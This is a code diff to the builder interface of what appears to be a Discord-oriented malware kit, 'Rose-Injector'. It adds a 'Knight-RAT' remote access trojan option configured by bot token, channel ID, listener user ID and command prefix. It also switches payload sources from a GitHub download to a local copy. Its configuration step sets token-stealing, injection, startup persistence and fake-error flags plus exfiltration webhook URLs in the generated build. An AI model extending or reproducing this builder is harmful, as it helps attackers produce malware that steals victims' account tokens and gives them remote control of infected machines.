@@ -153,12 +153,15 @@ def _makebuild(q: Queue, data_builder) -> str:
     if data_builder["build_name"] == "":
         ui.notify("Build Name is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
-    if data_builder["rat"] and data_builder["rat_url"] == "":
-        ui.notify("RAT URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+    if data_builder["rose-rat"] and data_builder["rose_rat_url"] == "":
+        ui.notify("Rose-RAT URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+        return
+    if data_builder["knight-rat"] and data_builder["knight_rat_bot_token"] == "":
+        ui.notify("Knight-RAT Bot Token is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
     
-    if data_builder["rat_url"] == "":
-        data_builder["rat_url"] = ".rat"
+    if data_builder["rose_rat_url"] == "":
+        data_builder["rose_rat_url"] = ".rat"
         
     if data_builder['vm_webhook_url'] == "":
         data_builder['vm_webhook_url'] = data_builder['webhook_url']
@@ -175,21 +178,15 @@ def _makebuild(q: Queue, data_builder) -> str:
         except Exception as e:
             logger.error(f"Error in create_dir: {e}")
 
-    def make_req():
+    def get_files():
         try:
-            logger.info("Entered make_req")
-            page = requests.get('https://github.com/DamagingRose/Rose-Injector/tree/main/components/source').text
-            soup = BeautifulSoup(page, 'html.parser')
-            allFiles = [link.text for link in soup.find_all('a') if link['href'] == f"/DamagingRose/Rose-Injector/blob/main/components/source/{link.text}"]
-            for file in allFiles:
-                text = requests.get(f"https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/source/{file}").text
-                logger.info(f"Got {file} with {len(text)} characters")
-                with open(f"{path}\\{file}","w",encoding="utf-8") as f:
-                    logger.info(f"Writing {file} to {path}")
-                    f.write(str(text))
-                logger.info(f"Successfuly wrote {file} to {path}")
+            cwd = os.getcwd()
+            ncwd = cwd.replace('roseui', 'source')
+            for file in os.listdir(ncwd):
+                shutil.copy(ncwd + '\\' + file, path)
+            logger.info(f'Successfully copied all files from {ncwd} to {path}')
         except Exception as e:
-            logger.error(f"Error in make_req: {e}")
+            logger.error(f"Error in get_files: {e}")
 
     def edit_config():
         try:
@@ -197,8 +194,13 @@ def _makebuild(q: Queue, data_builder) -> str:
             with open(f"{path}\\config.py","r",encoding="utf-8") as f:
                 text = f.read()
                 new = text.replace("WEBHOOK_URL", f"{data_builder['webhook_url']}") \
-                .replace("discord_rat = False", f"discord_rat = {data_builder['rat']}") \
-                .replace("DISCORD_RAT_SOCKET_LINK", f"{data_builder['rat_url']}") \
+                .replace("rose_discord_rat = False", f"rose_discord_rat = {data_builder['rose_rat']}") \
+                .replace("ROSE_DISCORD_RAT_SOCKET_LINK", f"{data_builder['rose_rat_url']}") \
+                .replace("knight_discord_rat = False", f"knight_discord_rat = {data_builder['knight_rat']}") \
+                .replace("KNIGHT_DISCORD_RAT_BOT_TOKEN", f"{data_builder['knight_bot_token']}") \
+                .replace("KNIGHT_DISCORD_RAT_CHANNEL_ID", f"{data_builder['knight_channel_id']}") \
+                .replace("KNIGHT_DISCORD_RAT_LISTENER_USER_ID", f"{data_builder['knight_user_id']}") \
+                .replace("KNIGHT_DISCORD_RAT_PREFIX", f"{data_builder['knight_prefix']}") \
                 .replace("startup = False", f"startup = {data_builder['startup']}") \
                 .replace("self.injection = False", f"self.injection = {data_builder['injection']}") \
                 .replace("self.token_stealing = False", f"self.token_stealing = {data_builder['token']}") \
@@ -243,7 +245,7 @@ def _makebuild(q: Queue, data_builder) -> str:
             
     create_dir()
     q.put_nowait(0.2)
-    make_req()
+    get_files()
     q.put_nowait(0.4)
     edit_config()
     q.put_nowait(0.6)
@@ -338,9 +340,19 @@ def _functions():
         with ui.expansion('Advanced', icon='work').classes('w-full'):
             with ui.column():
                 with ui.row():
-                    _rat = ui.checkbox('RAT', on_change=lambda e: change_data('rat', e.value)).props('inline color=yellow-7')
-                    ui.input(label='RAT Server URL', placeholder='Rose on top baby',
-                        on_change=lambda e: change_data('rat_url', e.value)).bind_visibility_from(_rat, 'value').props('inline color=yellow-7')
+                    _rose_rat = ui.checkbox('Rose-RAT', on_change=lambda e: change_data('rose_rat', e.value)).props('inline color=yellow-7')
+                    ui.input(label='Rose-RAT Server URL', placeholder='Rose on top baby',
+                        on_change=lambda e: change_data('rose_rat_url', e.value)).bind_visibility_from(_rose_rat, 'value').props('inline color=yellow-7')
+                with ui.row():
+                    _knight_rat = ui.checkbox('Knight-RAT', on_change=lambda e: change_data('knight_rat', e.value)).props('inline color=yellow-7')
+                    ui.input(label='Knight-RAT Bot Token', placeholder='Knight on top baby',
+                        on_change=lambda e: change_data('knight_bot_token', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
+                    ui.input(label='Knight-RAT Channel ID', placeholder='Knight on top baby',
+                        on_change=lambda e: change_data('knight_channel_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
+                    ui.input(label='Knight-RAT Listener User ID', placeholder='Knight on top baby',
+                        on_change=lambda e: change_data('knight_user_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
+                    ui.input(label='Knight-RAT Command Prefix', placeholder='Knight on top baby',
+                        on_change=lambda e: change_data('knight_prefix', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                 ui.checkbox('Ping', on_change=lambda e: change_data('ping', e.value)).props('inline color=yellow-7')
                 ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=yellow-7')
                 with ui.row():
